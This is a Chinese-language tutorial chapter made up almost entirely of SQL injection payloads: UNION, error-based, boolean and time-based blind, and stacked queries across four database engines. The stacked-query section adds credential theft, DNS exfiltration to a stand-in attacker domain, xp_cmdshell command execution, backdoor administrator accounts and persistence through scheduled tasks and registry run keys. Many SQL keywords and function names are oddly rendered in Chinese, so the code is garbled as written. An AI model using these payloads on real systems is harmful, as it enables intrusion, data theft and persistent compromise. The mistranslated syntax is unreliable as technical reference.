# 第五章：SQL语句构造艺术

## 5.1 联合查询语句构造

### 联合查询基础原理

#### 联合查询语法结构
```sql
-- 基本语法
SELECT 列1, 列2 FROM 表1 
UNION [ALL] 
SELECT 列1, 列2 FROM 表2;

-- 在注入中的使用
' UNION SELECT 1,2,3 -- 
' UNION SELECT 用户名,密码,3 FROM 用户表 -- 
```

#### 列数确定技巧
```sql
-- 方法1：ORDER BY 递增法
' ORDER BY 1 -- 
' ORDER BY 2 -- 
' ORDER BY 3 -- 
' ORDER BY 4 --   -- 直到报错，确定列数

-- 方法2：UNION SELECT 递增法
' UNION SELECT NULL -- 
' UNION SELECT NULL,NULL -- 
' UNION SELECT NULL,NULL,NULL --   -- 直到不报错，确定列数

-- 方法3：GROUP BY 递增法（替代ORDER BY）
' GROUP BY 1 -- 
' GROUP BY 2 -- 
```

### 数据类型匹配技巧

#### NULL值使用
```sql
-- 使用NULL适应各种数据类型
' UNION SELECT NULL,NULL,NULL -- 

-- 逐步替换NULL为实际数据
' UNION SELECT 1,NULL,NULL -- 
' UNION SELECT 1,'测试',NULL -- 
' UNION SELECT 1,'测试',3.14 -- 
```

#### 数据类型探测
```sql
-- 测试字符串类型
' UNION SELECT 'a',NULL,NULL -- 
' UNION SELECT NULL,'a',NULL -- 

-- 测试数字类型  
' UNION SELECT 1,NULL,NULL -- 
' UNION SELECT NULL,1,NULL -- 

-- 测试日期类型
' UNION SELECT CURDATE(),NULL,NULL -- 
' UNION SELECT NULL,NOW(),NULL -- 
```

### 信息获取语句构造

#### 数据库信息获取
```sql
-- MySQL
' UNION SELECT 
    版本信息,           -- 数据库版本
    当前数据库,          -- 当前数据库
    当前用户               -- 当前用户
-- 

-- PostgreSQL
' UNION SELECT 
    版本信息,
    当前数据库,
    当前用户
-- 

-- SQL Server
' UNION SELECT 
    版本信息,
    数据库名称,
    系统用户
-- 

-- Oracle
' UNION SELECT 
    版本标识,
    (SELECT 全局名称 FROM 全局名称表),
    用户 
FROM 版本视图 WHERE 行号=1
-- 
```

#### 表结构获取
```sql
-- MySQL - 获取所有表
' UNION SELECT 
    表模式,
    表名称, 
    表类型 
FROM 信息模式.表 
WHERE 表模式 NOT IN ('information_schema','mysql','performance_schema')
-- 

-- PostgreSQL - 获取所有表
' UNION SELECT 
    模式名称,
    表名称,
    表所有者 
FROM 系统表 
WHERE 模式名称 NOT IN ('information_schema','pg_catalog')
-- 

-- SQL Server - 获取所有表
' UNION SELECT 
    表目录,
    表名称,
    表类型 
FROM 信息模式.表
-- 

-- Oracle - 获取所有表
' UNION SELECT 
    所有者,
    表名称,
    表空间名称 
FROM 所有表
-- 
```

#### 列信息获取
```sql
-- MySQL - 获取用户表的列
' UNION SELECT 
    列名称,
    数据类型,
    列默认值 
FROM 信息模式.列 
WHERE 表名称 = '用户表'
-- 

-- 通用方法获取敏感列
' UNION SELECT 
    表名称,
    列名称,
    数据类型 
FROM 信息模式.列 
WHERE 列名称 LIKE '%密码%' OR 列名称 LIKE '%用户%'
-- 
```

#### 数据提取语句
```sql
-- 提取用户数据
' UNION SELECT 
    用户名,
    密码,
    邮箱 
FROM 用户表
-- 

-- 分页提取大量数据
' UNION SELECT 
    用户名,
    密码,
    NULL 
FROM 用户表 LIMIT 0,1
-- 

' UNION SELECT 
    用户名,
    密码,
    NULL 
FROM 用户表 LIMIT 1,1
-- 
```

## 5.2 报错注入语句构造

### 报错注入原理

#### 基于类型转换错误
```sql
-- MySQL
' AND 提取值函数(1, 连接函数(0x7e, (SELECT 用户()), 0x7e)) -- 

-- SQL Server
' AND 1=转换函数(int, (SELECT 用户)) -- 

-- PostgreSQL  
' AND 1=转换函数((SELECT 版本信息()) AS int) -- 
```

### MySQL报错注入技术

#### extractvalue()函数
```sql
-- 基本语法
' AND 提取值函数(1, 连接函数(0x7e, (SELECT 表达式), 0x7e)) -- 

-- 获取数据库版本
' AND 提取值函数(1, 连接函数(0x7e, (SELECT 版本信息()), 0x7e)) -- 

-- 获取当前用户
' AND 提取值函数(1, 连接函数(0x7e, (SELECT 用户()), 0x7e)) -- 

-- 获取所有数据库
' AND 提取值函数(1, 连接函数(0x7e, 
    (SELECT 分组连接函数(模式名称) 
     FROM 信息模式.数据库), 0x7e)) -- 
```

#### updatexml()函数
```sql
-- 基本语法
' AND 更新XML函数(1, 连接函数(0x7e, (SELECT 表达式), 0x7e), 1) -- 

-- 获取表名
' AND 更新XML函数(1, 连接函数(0x7e, 
    (SELECT 分组连接函数(表名称) 
     FROM 信息模式.表 
     WHERE 表模式=数据库()), 0x7e), 1) -- 

-- 获取列名
' AND 更新XML函数(1, 连接函数(0x7e, 
    (SELECT 分组连接函数(列名称) 
     FROM 信息模式.列 
     WHERE 表名称='用户表'), 0x7e), 1) -- 
```

#### 地板函数报错
```sql
-- 使用count()和floor()触发错误
' AND (SELECT 1 FROM (
    SELECT 计数(*), 连接函数(
        (SELECT 版本信息()), 
        地板(随机数(0)*2)
    ) x FROM 信息模式.表 分组 BY x
) a) -- 

-- 提取数据的完整示例
' AND (SELECT 1 FROM (
    SELECT 计数(*), 连接函数(
        (SELECT 连接函数(用户名, ':', 密码) FROM 用户表 LIMIT 1), 
        0x7e, 
        地板(随机数(0)*2)
    ) x FROM 信息模式.表 分组 BY x
) a) -- 
```

### 其他数据库报错注入

#### SQL Server报错注入
```sql
-- 使用convert函数
' AND 1=转换函数(int, (SELECT 版本信息)) -- 

-- 使用cast函数  
' AND 1=转换函数((SELECT 用户) AS int) -- 

-- 获取表名
' AND 1=转换函数(int, (
    SELECT 顶部 1 表名称 
    FROM 信息模式.表
)) -- 
```

#### PostgreSQL报错注入
```sql
-- 使用类型转换
' AND 1=转换函数((SELECT 版本信息()) AS int) -- 

-- 使用除零错误
' AND 1/(SELECT 情况 WHEN (SELECT 当前用户)='postgres' THEN 1 ELSE 0 END) -- 
```

#### Oracle报错注入
```sql
-- 使用CTXSYS.DRITHSX.SN
' AND 1=CTXSYS.DRITHSX.SN(1, (SELECT 用户 FROM 双表)) -- 

-- 使用UTL_INADDR.GET_HOST_NAME
' AND 1=UTL_INADDR.GET_HOST_NAME((SELECT 用户 FROM 双表)) -- 
```

### 报错注入数据提取优化

#### 数据截断处理
```sql
-- MySQL - 使用substring处理长数据
' AND 更新XML函数(1, 连接函数(0x7e, 
    (SELECT 子字符串(分组连接函数(表名称), 1, 30)
     FROM 信息模式.表), 0x7e), 1) -- 

-- 分片获取数据
' AND 更新XML函数(1, 连接函数(0x7e, 
    (SELECT 子字符串(分组连接函数(表名称), 1, 30)
     FROM 信息模式.表), 0x7e), 1) -- 

' AND 更新XML函数(1, 连接函数(0x7e, 
    (SELECT 子字符串(分组连接函数(表名称), 31, 30)
     FROM 信息模式.表), 0x7e), 1) -- 
```

#### 条件报错注入
```sql
-- 基于条件的报错
' AND 更新XML函数(1, 连接函数(0x7e, 
    (SELECT 情况 WHEN (SELECT 计数(*) FROM 用户表) > 0 
     THEN '有用户' ELSE '无用户' END), 0x7e), 1) -- 

-- 逐字符提取
' AND 更新XML函数(1, 连接函数(0x7e, 
    (SELECT 子字符串((SELECT 用户()), 1, 1)), 0x7e), 1) -- 
```

## 5.3 布尔盲注语句构造

### 布尔盲注基础

#### 真/假条件测试
```sql
-- 基础布尔测试
' AND 1=1 --   (真条件)
' AND 1=2 --   (假条件)

-- 基于数据库信息的布尔测试
' AND (SELECT 用户()) = 'root@localhost' -- 
' AND (SELECT 计数(*) FROM 用户表) > 0 -- 
```

### 数据长度探测

#### 数据库名长度
```sql
-- MySQL
' AND 长度(数据库()) = 8 -- 

-- PostgreSQL
' AND 长度(当前数据库()) = 8 -- 

-- SQL Server
' AND 长度(数据库名称()) = 8 -- 

-- Oracle
' AND 长度((SELECT 全局名称 FROM 全局名称表)) = 8 -- 
```

#### 表名长度探测
```sql
-- 探测用户表的长度
' AND (SELECT 长度(表名称) 
      FROM 信息模式.表 
      WHERE 表模式=数据库() 
      LIMIT 1) = 5 --   ('用户表' = 5个字符)
```

### 逐字符猜解技术

#### 字符比较方法
```sql
-- 方法1：等于比较
' AND 子字符串(数据库(), 1, 1) = 'a' -- 

-- 方法2：大于小于比较（二分法）
' AND ASCII码(子字符串(数据库(), 1, 1)) > 100 -- 
' AND ASCII码(子字符串(数据库(), 1, 1)) < 110 -- 
' AND ASCII码(子字符串(数据库(), 1, 1)) = 105 --  ('i' = 105)

-- 方法3：LIKE比较
' AND 数据库() LIKE 'a%' -- 
' AND 数据库() LIKE 'ab%' -- 
```

#### 完整数据提取流程
```sql
-- 步骤1：获取数据库名长度
' AND 长度(数据库()) = 8 -- 

-- 步骤2：逐字符猜解数据库名
' AND ASCII码(子字符串(数据库(), 1, 1)) = 109 --  ('m' = 109)
' AND ASCII码(子字符串(数据库(), 2, 1)) = 121 --  ('y' = 121)
' AND ASCII码(子字符串(数据库(), 3, 1)) = 100 --  ('d' = 100)
' AND ASCII码(子字符串(数据库(), 4, 1)) = 98 --   ('b' = 98)
...

-- 步骤3：获取表数量
' AND (SELECT 计数(*) 
      FROM 信息模式.表 
      WHERE 表模式=数据库()) = 5 -- 

-- 步骤4：获取第一个表名长度
' AND (SELECT 长度(表名称) 
      FROM 信息模式.表 
      WHERE 表模式=数据库() 
      LIMIT 1) = 5 -- 

-- 步骤5：逐字符猜解第一个表名
' AND ASCII码(子字符串(
      (SELECT 表名称 
       FROM 信息模式.表 
       WHERE 表模式=数据库() 
       LIMIT 1), 1, 1)) = 117 --  ('u' = 117)
...
```

### 高级布尔盲注技巧

#### 位运算加速
```sql
-- 使用位运算快速猜解ASCII值
' AND (ASCII码(子字符串(数据库(), 1, 1)) >> 1) & 1 = 1 -- 
' AND (ASCII码(子字符串(数据库(), 1, 1)) >> 2) & 1 = 0 -- 
```

#### 条件聚合查询
```sql
-- 使用CASE语句
' AND (SELECT 情况 
    WHEN (ASCII码(子字符串(数据库(), 1, 1)) = 109) 
    THEN 1 ELSE 0 END) = 1 -- 

-- 使用IF语句（MySQL）
' AND 如果(ASCII码(子字符串(数据库(), 1, 1)) = 109, 1, 0) = 1 -- 
```

#### 多条件组合
```sql
-- 同时检查多个条件
' AND (ASCII码(子字符串(数据库(), 1, 1)) = 109) 
   AND (长度(数据库()) = 8) -- 
```

## 5.4 时间盲注语句构造

### 时间盲注基础

#### 延时函数使用
```sql
-- MySQL
' AND 睡眠(5) -- 
' AND 如果(1=1, 睡眠(5), 0) -- 
' AND 基准测试(1000000, MD5('测试')) -- 

-- PostgreSQL
' AND 数据库睡眠(5) -- 

-- SQL Server
'; 等待延迟 '0:0:5' -- 

-- Oracle
' AND 数据库锁睡眠(5) -- 
```

### 基于条件的时间盲注

#### 基础条件延时
```sql
-- MySQL
' AND 如果(ASCII码(子字符串(数据库(), 1, 1)) = 109, 睡眠(5), 0) -- 

-- PostgreSQL
' AND (情况 WHEN ASCII码(子字符串(当前数据库(), 1, 1)) = 109 
       THEN 数据库睡眠(5) ELSE 数据库睡眠(0) END) -- 

-- SQL Server
'; 如果 (ASCII码(子字符串(数据库名称(), 1, 1)) = 109) 等待延迟 '0:0:5' -- 

-- Oracle
' AND (情况 WHEN (ASCII码(子字符串((SELECT 全局名称 FROM 全局名称表), 1, 1)) = 109) 
       THEN 数据库锁睡眠(5) ELSE 1 END) = 1 -- 
```

#### 完整数据提取流程
```sql
-- 步骤1：探测数据库名长度
' AND 如果(长度(数据库()) = 8, 睡眠(5), 0) -- 

-- 步骤2：逐字符猜解数据库名
' AND 如果(ASCII码(子字符串(数据库(), 1, 1)) = 109, 睡眠(5), 0) -- 
' AND 如果(ASCII码(子字符串(数据库(), 2, 1)) = 121, 睡眠(5), 0) -- 
' AND 如果(ASCII码(子字符串(数据库(), 3, 1)) = 100, 睡眠(5), 0) -- 
...

-- 步骤3：探测表数量
' AND 如果((SELECT 计数(*) 
         FROM 信息模式.表 
         WHERE 表模式=数据库()) = 5, 睡眠(5), 0) -- 

-- 步骤4：探测表名
' AND 如果(ASCII码(子字符串(
         (SELECT 表名称 
          FROM 信息模式.表 
          WHERE 表模式=数据库() 
          LIMIT 1), 1, 1)) = 117, 睡眠(5), 0) -- 
```

### 时间盲注优化技巧

#### 响应时间基准
```sql
-- 建立基准响应时间
' AND 睡眠(1) --   (观察正常延迟)
' AND 睡眠(0.5) -- (观察短延迟)

-- 使用相对时间而非绝对时间
' AND 如果(条件, 睡眠(2), 睡眠(0.1)) -- 
```

#### 减少请求次数
```sql
-- 使用二分法减少请求
' AND 如果(ASCII码(子字符串(数据库(), 1, 1)) > 100, 睡眠(2), 0) -- 
' AND 如果(ASCII码(子字符串(数据库(), 1, 1)) > 150, 睡眠(2), 0) -- 
' AND 如果(ASCII码(子字符串(数据库(), 1, 1)) = 125, 睡眠(2), 0) -- 
```

#### 错误容忍机制
```sql
-- 多次尝试避免网络波动影响
' AND 如果(条件, 睡眠(2), 0) --   (重复3次确认)
```

### 多数据库时间函数

#### 各数据库延时函数对比
```sql
-- MySQL
睡眠(5)
基准测试(1000000, MD5('测试'))
获取锁('测试', 5)

-- PostgreSQL
数据库睡眠(5)
-- 替代方法：复杂查询消耗时间
SELECT 计数(*) FROM 生成序列(1,1000000)

-- SQL Server
等待延迟 '0:0:5'
-- 替代方法
开始 声明 @变量 int; 设置 @变量 = 0; 循环 @变量 < 1000000 设置 @变量 = @变量 + 1; 结束

-- Oracle
数据库锁睡眠(5)
-- 替代方法
SELECT 计数(*) FROM 所有对象 a, 所有对象 b, 所有对象 c
```

## 5.5 堆叠查询语句构造

### 堆叠查询基础

#### 堆叠查询原理
```sql
-- 基本语法：使用分号分隔多个查询
'; SELECT 1; SELECT 2; -- 

-- 在注入中的使用
'; INSERT INTO 日志表 (消息) VALUES ('被入侵'); -- 
'; 删除表 用户表; -- 
```

### 多数据库堆叠查询

#### MySQL堆叠查询
```sql
-- 基础堆叠查询
'; SELECT 1; SELECT 2; -- 

-- 执行系统命令（需要UDF）
'; SELECT 系统执行('whoami'); -- 

-- 创建用户
'; INSERT INTO mysql.用户 (主机, 用户, 密码) VALUES ('%', '黑客', 密码('password')); -- 

-- 授权操作
'; 授权所有权限 ON *.* TO '黑客'@'%'; -- 
```

#### PostgreSQL堆叠查询
```sql
-- 基础堆叠查询
'; SELECT 1; SELECT 2; -- 

-- 创建表
'; 创建表 被入侵表 (数据 text); -- 

-- 插入数据
'; INSERT INTO 被入侵表 (数据) VALUES ('已入侵'); -- 

-- 命令执行（需要权限）
'; 创建或替换函数 系统(命令 text) 返回 int AS $$
      开始 返回 0; 结束;
   $$ 语言 plpgsql; 
   SELECT 系统('whoami'); -- 
```

#### SQL Server堆叠查询
```sql
-- 基础堆叠查询
'; SELECT 1; SELECT 2; -- 

-- 启用xp_cmdshell
'; 执行 sp_configure '显示高级选项', 1; 重新配置; 
   执行 sp_configure 'xp_cmdshell', 1; 重新配置; -- 

-- 执行系统命令
'; 执行 xp_cmdshell 'whoami'; -- 

-- 添加用户
'; 执行 master..xp_cmdshell 'net user 黑客 Password123 /add'; -- 
'; 执行 master..xp_cmdshell 'net localgroup administrators 黑客 /add'; -- 
```

#### Oracle堆叠查询
```sql
-- Oracle通常不支持堆叠查询，但可以尝试PL/SQL块
'; 开始 
     立即执行 '授权 DBA TO 黑客'; 
   结束; -- 
```

### 堆叠查询高级利用

#### 数据窃取技术
```sql
-- 创建临时表存储数据
'; 创建表 临时表 AS SELECT * FROM 用户表; -- 

-- 将数据导出到Web目录
'; SELECT * FROM 用户表 INTO OUTFILE '/var/www/html/被盗数据.txt'; -- 

-- 通过DNS外带数据
'; SELECT 加载文件(连接函数('\\\\', (SELECT 密码 FROM 用户表 LIMIT 1), '.攻击者.com\\test')); -- 
```

#### 权限提升技术
```sql
-- MySQL权限提升
'; 授权 文件 ON *.* TO '当前用户'@'localhost'; -- 
'; 授权 超级 ON *.* TO '当前用户'@'localhost'; -- 

-- PostgreSQL权限提升  
'; 修改用户 当前用户 WITH 超级用户; -- 

-- 创建存储过程执行命令
'; 创建函数 系统评估 返回 string SONAME 'udf.dll'; 
   SELECT 系统评估('whoami'); -- 
```

#### 持久化技术
```sql
-- 创建后门用户
'; INSERT INTO mysql.用户 (主机, 用户, 密码) 
   VALUES ('%', '后门', 密码('backdoor123')); 
   刷新权限; -- 

-- 创建计划任务（Windows）
'; 执行 xp_cmdshell 'schtasks /create /tn "后门" /tr "cmd.exe" /sc minute /mo 1'; -- 

-- 创建启动项
'; 执行 xp_cmdshell 'reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v 后门 /t REG_SZ /d "C:\backdoor.exe"'; -- 
```

### 堆叠查询限制与绕过

#### 应用程序限制
```sql
-- 应用程序可能只处理第一个查询结果
-- 解决方案：使用不返回结果的查询
'; INSERT INTO 日志表 VALUES ('测试'); SELECT 1; -- 

-- 使用存储过程绕过限制
'; 调用 存储过程名(); -- 
```

#### 数据库配置限制
```sql
-- MySQL的multi_statements设置
-- 检查是否启用
显示变量 LIKE 'multi_statements';

-- 如果禁用，尝试其他注入技术
-- 或者使用UNION-based替代
```

**下一章**: [第六章：工具链实战应用](06-工具链实战应用.md)

> 注意：本章内容仅用于安全学习和研究，请在合法授权的环境中进行测试。